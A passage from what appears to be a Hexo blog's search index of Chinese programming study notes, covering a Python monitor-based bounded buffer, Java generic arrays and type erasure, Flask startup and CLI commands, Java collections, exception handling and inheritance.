class="line"><span class="string">        :param lock: 管程的锁。同一时刻只有一个线程能获得管程内的资源</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.wait_value += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"Now we are in the thread: &#123;&#125;, executing wait()"</span>.format(get_ident()))</span><br><span class="line">        lock.release()  <span class="comment"># 释放当前线程的lock，让别的线程有机会被执行</span></span><br><span class="line">        event.wait()  <span class="comment"># 阻塞当前线程</span></span><br><span class="line">        lock.acquire()  <span class="comment"># 请求再次进入管程</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">signal</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        如果有线程挂在这个条件变量上，signal 选择一个唤醒；如果没有这就是个空操作</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> self.wait_value &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"Now we are in the thread: &#123;&#125;, executing signal()"</span>.format(get_ident()))</span><br><span class="line">            event.set()  <span class="comment"># 唤醒一个线程</span></span><br><span class="line">            self.wait_value -= <span class="number">1</span></span><br><span class="line">            event.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BoundBuffer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, max)</span>:</span></span><br><span class="line">        self.count = <span class="number">0</span>  <span class="comment"># 共享资源</span></span><br><span class="line">        self.not_full = Condition()  <span class="comment"># 条件变量</span></span><br><span class="line">        self.not_empty = Condition()  <span class="comment"># 条件变量</span></span><br><span class="line">        self.lock = Lock()  <span class="comment"># 锁</span></span><br><span class="line">        self.buffer = deque()</span><br><span class="line">        self.max = max</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deposit</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.lock.acquire()</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> self.count == self.max:</span><br><span class="line">                self.not_full.wait(self.lock)</span><br><span class="line">            product = randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">            self.buffer.append(product)</span><br><span class="line">            print(<span class="string">"add &#123;&#125; to the buffer"</span>.format(product))</span><br><span class="line">            self.count += <span class="number">1</span></span><br><span class="line">            self.not_empty.signal()</span><br><span class="line">            self.lock.release()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.lock.acquire()</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> self.count == <span class="number">0</span>:</span><br><span class="line">                self.not_empty.wait(self.lock)</span><br><span class="line">            print(<span class="string">"remove &#123;&#125; from the buffer"</span>.format(self.buffer.popleft()))</span><br><span class="line">            self.count -= <span class="number">1</span></span><br><span class="line">            self.not_full.signal()</span><br><span class="line">            self.lock.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    model = BoundBuffer(<span class="number">3</span>)</span><br><span class="line">    generator = Thread(target=model.deposit,)</span><br><span class="line">    comsumer = Thread(target=model.remove,)</span><br><span class="line">    generator.start()</span><br><span class="line">    comsumer.start()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 禁止创建泛型数组</title>
    <url>/2019/01/27/Java%E5%9F%BA%E7%A1%80%E2%80%94%E2%80%94%E6%B3%9B%E5%9E%8B%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p>java 不允许直接创建泛型数组，也不允许创建泛型实例。也就是说下面这种情况是不被允许的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> T[] a = <span class="keyword">new</span> T[<span class="number">1</span>]; <span class="comment">// error</span></span><br><span class="line">  <span class="keyword">private</span> T t = <span class="keyword">new</span> T(); <span class="comment">// error</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>java 的泛型只停留在了编译层，编译器在编译完成后，会把泛型信息擦除，用第一个限定类型来替代，没有指定限定类型的泛型参数则用 Object 类替代：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 指定了泛型参数的限定类型</span></span><br><span class="line"><span class="keyword">public</span> &lt;T extends Comparable&gt; <span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 经编译器类型擦除后</span></span><br><span class="line"><span class="keyword">public</span> &lt;Comparable&gt; <span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无限定类型</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 经编译器类型擦除后</span></span><br><span class="line"><span class="keyword">public</span> &lt;Object&gt; <span class="function"><span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;...&#125;</span><br></pre></td></tr></table></figure>
<p>经过类型擦除后，拥有不同泛型参数的泛型类在虚拟机眼中就是一样的了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test&lt;String&gt; t1 = <span class="keyword">new</span> Test&lt;&gt;();</span><br><span class="line">Test&lt;Integer&gt; t2 = <span class="keyword">new</span> Test&lt;&gt;();</span><br><span class="line">t1.getClass() == t2.getClass(); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>java 允许父类的引用类型指向子类实例，而 Object[ ] 是任何数组的父类，这个时候如果我们往里面放不同于原始数据类型 但是满足后来使用的父类类型的话，编译不会有问题。如果是普通类，这样做也不会有什么问题，因为在运行时会检查加入数组的对象的类型，所以下面这段代码运行时会报错 ArrayStoreException：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] s = <span class="keyword">new</span> String[<span class="number">10</span>];</span><br><span class="line">Object[] o = s; <span class="comment">// OK</span></span><br><span class="line">Integer i = <span class="keyword">new</span> Integer(<span class="number">2</span>);</span><br><span class="line">o[<span class="number">0</span>] = i; <span class="comment">// throws ArrayStoreException</span></span><br></pre></td></tr></table></figure>
<p>如果可以创建泛型数组，那么一个 Object 数组引用类型指向这个泛型数组实例是可行的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Test&lt;String&gt;[] tarr = new Test&lt;&gt;[10]; // 实际不行，假设可行</span><br><span class="line">Object[] o = tarr;</span><br></pre></td></tr></table></figure>
<p>编译器编译时会根据引用类型进行类型检查，所以以下代码可以通过编译。在运行时会检查加入数组的对象的类型，但由于类型擦除，不同泛型参数的泛型类在虚拟机眼里是类型相同的，那么在运行时一个 Test<integer> 实例成功被放进 Test<string>[ ] 中了：</string></integer></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Test&lt;Integer&gt; t = <span class="keyword">new</span> Test&lt;&gt;();</span><br><span class="line">o[<span class="number">0</span>] = t;</span><br></pre></td></tr></table></figure>
<p>一个与泛型数组类型不同的实例可以被加入数组中而 java 无法检测到这一错误。那么很显然无法保证泛型数组元素类型的一致性，其后果不言而喻。</p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask——启动吧，Flask！</title>
    <url>/2018/11/15/Flask%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="新一代虚拟环境工具：pipenv"><a href="#新一代虚拟环境工具：pipenv" class="headerlink" title="新一代虚拟环境工具：pipenv"></a>新一代虚拟环境工具：pipenv</h1><p>以前虚拟环境主要靠 virtualenv， 配合 requirements.txt 做到一键安装依赖的效果。但是 requirements.txt 需要手动管理包记录，每次安装新的包之后都要更新这个文件，很麻烦。现在有了新的工具 pipenv。pipenv 将虚拟环境配置与依赖包管理整合在一起，并自动记录依赖包的安装、更新与卸载。真正做到了”一键使用“。pipenv 的用法参考<a href="https://zhuanlan.zhihu.com/p/37581807" target="_blank" rel="noopener">这篇文章</a>。</p>
<h1 id="启动Flask"><a href="#启动Flask" class="headerlink" title="启动Flask"></a>启动Flask</h1><p>在 Flask 更新到版本 1.0 以后，不再推荐使用下面的方式启动 Flask</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.run()</span><br></pre></td></tr></table></figure>
<p>取而代之的是命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flask run</span><br></pre></td></tr></table></figure>
<p>Flask 根据以下规则会自动探测程序实例：</p>
<ol>
<li>从当前目录寻找 app.py 或 wsgi.py 模块，并从中寻找名为 app 或 application 的实例</li>
<li>从环境变量 FLASK_APP 对应的值寻找名为 app 或 application 的实例</li>
</ol>
<p>例如，如果 Flask 实例 app 位于 hello.py，将 FLASK_APP 设为 hello，Flask 就会在当前目录的 hello.py 模块寻找实例</p>
<p>Flask 默认为生产模式(production mode), 通过环境变量 FLASK_ENV 可以修改为开发模式(debug mode)：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FLASK_ENV = development</span><br></pre></td></tr></table></figure>
<p>利用 –host 与 –port 参数可以修改 Flask 运行主机与端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flask run --host=0.0.0.0</span><br><span class="line">flask run --port=9000</span><br></pre></td></tr></table></figure>
<p>也可以通过环境变量 FLASK_RUN_HOST 与 FLASK_RUN_PORT 设置。</p>
<p>可以通过 <code>flask --help</code> 查看所有可用命令</p>
<h1 id="管理环境变量"><a href="#管理环境变量" class="headerlink" title="管理环境变量"></a>管理环境变量</h1><p>如果安装了 python-dotenv 包， Flask 会从 .env 文件 和 .flaskenv 文件中加载环境变量。此时 Flask 加载环境变量的优先级是：系统环境变量 &gt; .env 中的环境变量 &gt; .flaskenv 中的环境变量</p>
<p>.env 用于存放公开环境变量, 如 FLAKS_APP, .flaskenv 用于存放敏感环境变量如 Email 账号密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!# MyFlask/.env</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 这是注释</span><br><span class="line">FLASK_APP = hello</span><br></pre></td></tr></table></figure>
<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>用如下命令可以启动带有上下文的 Python Shell 环境：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flask shell</span><br></pre></td></tr></table></figure>
<p>和其他 flask 命令相同，在执行这个命令前要确保 Flask 实例可以被找到</p>
<h1 id="flask-命令"><a href="#flask-命令" class="headerlink" title="flask 命令"></a>flask 命令</h1><p>通过为一个函数添加 @app.cli.command() 装饰器，可以注册一个 flask 命令。函数的名称即为命令名，也可以通过给装饰器传参的方式命名：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.cli.command('greet')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    click.echo(<span class="string">'hello!'</span>)</span><br></pre></td></tr></table></figure>
<p>flask 命令是通过 Click 包实现的，更多关于自定义命令的设置和功能请看<a href="http://click.pocoo.org/6/" target="_blank" rel="noopener">Click文档</a></p>
]]></content>
      <categories>
        <category>Web开发</category>
      </categories>
      <tags>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>java基础-使用集合类</title>
    <url>/2018/06/28/java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h1 id="将集合的接口与实现分离"><a href="#将集合的接口与实现分离" class="headerlink" title="将集合的接口与实现分离"></a>将集合的接口与实现分离</h1><p>Java集合类库将<code>接口（interface）</code>与<code>实现（implementation）</code>分离。在使用集合类时，一旦构建了集合就不需要知道究竟使用了哪种实现，因此只有在构建集合对象时使用具体的类才有意义。可以使用<code>接口类型</code>存放集合的引用：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Queue&lt;Customer&gt; expressLane = <span class="keyword">new</span> LinkedListQueue&lt;&gt;();</span><br><span class="line">expressLane.add(<span class="keyword">new</span> Customer(<span class="string">"David"</span>));</span><br></pre></td></tr></table></figure></p>
<p>这样做有利于随时更改实现类型，当发现有更合适的实现类时，只需要修改调用构造器处的代码就可以了：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Queue&lt;Customer&gt; expressLane = <span class="keyword">new</span> CirculArrayQueue&lt;&gt;(<span class="number">100</span>);</span><br></pre></td></tr></table></figure></p>
<h1 id="Collection接口"><a href="#Collection接口" class="headerlink" title="Collection接口"></a>Collection接口</h1><p>集合类的基本接口是<code>Collection接口</code>,这个接口有两个方法：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Collection</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E element)</span></span>;</span><br><span class="line">    <span class="function">Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span></span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>add方法用于向集合中添加元素。如果添加成功返回true，否则false。<br>iterator方法返回一个实现了Iterator接口的对象，这个对象又称为<code>迭代器</code>，可以用这个迭代器依次访问集合中的元素</p>
<h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>Iterator接口包含4个方法：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function">E <span class="title">next</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="keyword">super</span> E&gt; action)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Java迭代器的查找与位置变更是紧密相连的，查找一个元素的唯一方法是调用<code>next()</code>，而在执行查找操作时，迭代器的位置随之向前移动。当调用<code>next()</code>时，迭代器就越过下一个元素并返回刚刚越过的那个元素的引用。而<code>remove()</code>会从迭代器中删除上次调用<code>next()</code>方法时返回的元素。</p>
<p>迭代器应理解为处于两个元素之间，当调用<code>next()</code>时，迭代器就越过下一个元素并返回刚刚越过的那个元素的引用。</p>
<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><p>Java中所有链表都是双向的。对于链表，尽量不使用随机访问而使用遍历操作，否则效率很低。Java提供了LinkedList类，可以很简单实现列表：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; staff = <span class="keyword">new</span> LinkedList&lt;&gt;(); <span class="comment">// LinkedList类实现了List接口</span></span><br><span class="line">staff.add(<span class="string">"Susan"</span>);</span><br><span class="line">staff.add(<span class="string">"David"</span>);</span><br><span class="line">staff.add(<span class="string">"Mike"</span>);</span><br><span class="line">Iterator&lt;String&gt; iterator = staff.iterator();</span><br><span class="line">iterator.next();</span><br><span class="line">iterator.remove();</span><br></pre></td></tr></table></figure></p>
<p>通过<code>add</code>方法可以向链表尾部添加元素。想要在链表中间插入元素，由于迭代器是表述集合中位置的，所以要借助迭代器实现，而只有在有序集合中这样做才有意义，Iterator是使用与所有集合的，所以对于有序集合，Java提供了Iterator的子类ListIterator：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; staff = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">staff.add(<span class="string">"Susan"</span>);</span><br><span class="line">staff.add(<span class="string">"David"</span>);</span><br><span class="line">ListIterator&lt;String&gt; iter = staff.ListIterator();</span><br><span class="line">iter.next();</span><br><span class="line">iter.add(<span class="string">"Mike"</span>); <span class="comment">// 在Susan之后，David之前添加Mike</span></span><br><span class="line">String first = iter.previous();  <span class="comment">// 反向遍历链表</span></span><br><span class="line">iter.remove(); <span class="comment">// 删除被previous越过的元素Mike</span></span><br></pre></td></tr></table></figure></p>
<p><code>set</code>方法用于替换被next或previous越过的元素：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; staff = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">staff.add(<span class="string">"Susan"</span>);</span><br><span class="line">staff.add(<span class="string">"David"</span>);</span><br><span class="line">staff.next();</span><br><span class="line">staff.set(<span class="string">"Mike"</span>); <span class="comment">// Susan被替换为Mike</span></span><br></pre></td></tr></table></figure></p>
<h1 id="泛型数组列表"><a href="#泛型数组列表" class="headerlink" title="泛型数组列表"></a>泛型数组列表</h1><p>在Java中，可以用变量来确定数组的大小：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Employee staff[] = <span class="keyword">new</span> Employee[num];</span><br></pre></td></tr></table></figure></p>
<p>为了达到数组动态变长/缩短的效果，使用泛型数组列表<code>ArrayList</code>。<em>泛型</em>即“参数化类型”、将类型参数化，类似于方法中的变量参数，只是此时类型也定义成参数形式（又称为类型参数）。为了指定数组列表保存的元素对象类型，需要用一对尖括号将类名括起来加在后面：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Employee&gt; staff = <span class="keyword">new</span> ArrayList&lt;Employee&gt;();</span><br></pre></td></tr></table></figure></p>
<p>用<code>add([int index,]obj)</code>方法往数组列表添加元素，不指定索引则默认加到末尾。<code>remove(int index)</code>删除元素，<code>get(int index)</code>按索引获取元素，<code>set(int index, obj)</code>重置对应索引的元素（不能用于添加元素），<code>size()</code>方法获取ArrayList长度。</p>
<h2 id="将数组列表拷贝到数组"><a href="#将数组列表拷贝到数组" class="headerlink" title="将数组列表拷贝到数组"></a>将数组列表拷贝到数组</h2><p>用<code>toArray()</code>方法：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">X[] a = <span class="keyword">new</span> X[list.size()];</span><br><span class="line">list.toArray(a);</span><br></pre></td></tr></table></figure></p>
<h2 id="泛型化与原始数组列表之间的兼容性"><a href="#泛型化与原始数组列表之间的兼容性" class="headerlink" title="泛型化与原始数组列表之间的兼容性"></a>泛型化与原始数组列表之间的兼容性</h2><p>在编译之后程序会采取去泛型化的措施。也就是说Java中的泛型，只在编译阶段有效。在编译过程中，正确检验泛型结果后，会将泛型的相关信息擦除，并且在对象进入和离开方法的边界处添加类型检查和类型转换的方法。也就是说，泛型信息不会进入到运行时阶段。</p>
<p>对此总结成一句话：泛型类型在逻辑上看以看成是多个不同的类型，实际上都是相同的基本类型ArrayList。</p>
<h1 id="散列集与树集"><a href="#散列集与树集" class="headerlink" title="散列集与树集"></a>散列集与树集</h1><p>散列集的查找性能比数组和链表都要高。散列表为每个对象计算一个数，称为<code>散列码</code>，散列码由对象的实例域产生一个整数，具有不同数据域的对象产生不同的散列码。java提供了<code>set</code>接口，由<code>HashSet</code>类实现。散列迭代器将依次访问所有的桶，由于散列将元素分散在表的各个位置上，所以访问它们的顺序几乎是随机的。</p>
<p>树集<code>TreeSet</code>类与HashSet十分相似，不过在遍历树集中的元素时默认按添加顺序排序。也可以在构造树集时提供一个Comparator改变排序规则。TreeSet类实现了<code>SortedSet</code>接口和<code>NavigableSet</code>接口。</p>
<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>队列可以在尾部添加一个元素，在头部删除一个元素。有两个端头的队列称为<code>双端队列</code>，可以在头部和尾部同时添加或删除元素。不支持在队列中间插入元素。java提供了<code>Deque</code>接口并由<code>ArrayDeque</code>和<code>LinkedList</code>类实现，这两个类都提供了双端队列。</p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础—处理异常</title>
    <url>/2018/06/24/Java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E2%80%94-%E5%A4%84%E7%90%86%E5%BC%82%E5%B8%B8/</url>
    <content><![CDATA[<p>处理异常的任务就是将控制权从错误产生的地方转移给能够处理这种情况的错误处理器。如果某个方法不能采用正常的途径完成他的任务 ，就可以通过另外一个路径退出方法。在这种情况下，方法并不能返回任何值，而是抛出（throw）一个封装了错误信息的对象，然后这个方法会退出且不返回任何值。</p>
<p>异常又分为<code>受查(check)异常</code>与<code>非受查(uncheck)异常</code>。非受查异常包括Error类异常与RuntimeException类异常，这些异常都是因为程序本身设计不合理产生的，属于逻辑异常。而受查异常表示其他异常，如IOException。处理异常指的是处理受查异常。</p>
<p><img src="http://p1csf090h.bkt.clouddn.com/java/error2412.png" alt="异常分类"></p>
<h1 id="throws-throw抛出异常"><a href="#throws-throw抛出异常" class="headerlink" title="throws/throw抛出异常"></a>throws/throw抛出异常</h1><p>一个方法不仅需要告诉编译器将要返回什么值，还要告诉编译器有可能发生什么错误。所以方法应在其首部声明所有可能抛出的异常，这样可以从首部反映出这个方法可能抛出哪类受查异常。这就要用到<code>throws</code>关键字。例如FileInputStream类的构造器方法可能由于文件不存在而抛出一个FileNotFoundException：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileInputStream</span><span class="params">(String name)</span> <span class="keyword">throws</span> FileNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>多个Exception之间用 <code>，</code>分开。<br>如果超类方法没有抛出任何异常，那么子类方法也不能抛出异常。</p>
<p>如果要手动抛出一个异常，用关键字<code>throw</code>。首先构造一个异常对象，然后用throw把这个对象抛出就可以了。如抛出一个EOFException：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> EOFException；</span><br></pre></td></tr></table></figure></p>
<h1 id="try-catch捕获异常"><a href="#try-catch捕获异常" class="headerlink" title="try/catch捕获异常"></a>try/catch捕获异常</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ExceptionType e)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以使用多个单独的catch字句捕获多个异常。<br>异常对象可能包含与异常本身相关的信息，要想获得对象的更多信息可以用<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">e.getMessage()</span><br></pre></td></tr></table></figure></p>
<p>对实现了AutoCloseable接口的资源进行处理时，可以使用带资源的try语句，这样无论是否成功使用资源，在try块退出时都会自动关闭资源：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> (Resource res = ...)</span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开hello.txt</span></span><br><span class="line"><span class="keyword">try</span> (FileWriter writer = <span class="keyword">new</span> FileWriter(<span class="string">'hello.txt'</span>, <span class="keyword">true</span>))</span><br><span class="line">&#123;</span><br><span class="line">    deal with the resource</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译器严格执行throws说明符，<strong>如果方法A调用了方法B，而方法B被声明为可能抛出异常e，则A要么继承e（即声明为可能抛出e），要么捕获e</strong></p>
<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>finally块中的代码不管是否有异常被捕获，都会执行。并且如果处理结果与try/catch中的处理发生冲突，finally中的处理结果会覆盖之。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ExceptionType e)</span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="Throwable"><a href="#Throwable" class="headerlink" title="Throwable"></a>Throwable</h1><p>Throwable是类，Error和Exception都继承自这个类。所以也可以用try/catch进行捕捉<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;<span class="keyword">catch</span>(Throwable t) &#123;</span><br><span class="line">    t.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在方法声明中，也可以抛出Throwable类异常，由这个方法的调用者处理：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Throwable</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Throwable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Throwable t) &#123;</span><br><span class="line">        t.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础—继承与多态</title>
    <url>/2018/06/15/Java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E2%80%94%E2%80%94%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%A4%9A%E6%80%81/</url>
    <content><![CDATA[<p>修饰符<code>extends</code>表示继承，子类会继承超类的域和方法。例如子类Manager继承超类Employee：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 添加新的域或方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="覆盖方法"><a href="#覆盖方法" class="headerlink" title="覆盖方法"></a>覆盖方法</h1><p>想要访问超类的私域，需要使用修饰符<code>super</code>，用 <code>super</code> 代表超类。如：<code>重写</code>Manager的getsalary方法为基本工资+奖金。而salsry是private的，只有Employee类的方法才能访问。要获得基本工资必须通过调用超类getsalary方法。为了区别这两个方法，超类的方法表示为<code>super.funcname([args])</code>的形式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getSalary</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.salary = bonus + <span class="keyword">super</span>.getsalary();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.salary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>覆盖方法时，一定要保证返回类型的兼容性。允许子类将覆盖方法的返回类型定义为原返回类型的子类型</strong>。<br><strong>覆盖方法时，子类方法可见性不能低于超类。如果超类方法是public，那么覆盖方法也是public</strong></p>
<h1 id="子类构造器"><a href="#子类构造器" class="headerlink" title="子类构造器"></a>子类构造器</h1><p>由于子类不能访问超类的私有域，所以必须在子类构造器中利用超类的构造器对超类私有域进行初始化。通过关键字<code>super</code>实现对超类构造器的调用。</p>
<p><strong><code>super</code>调用构造器语句必须是子类构造器的第一条语句：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> bonus;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Manager</span><span class="params">(String aName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(aName);</span><br><span class="line">        <span class="keyword">this</span>.bonus = <span class="number">500</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
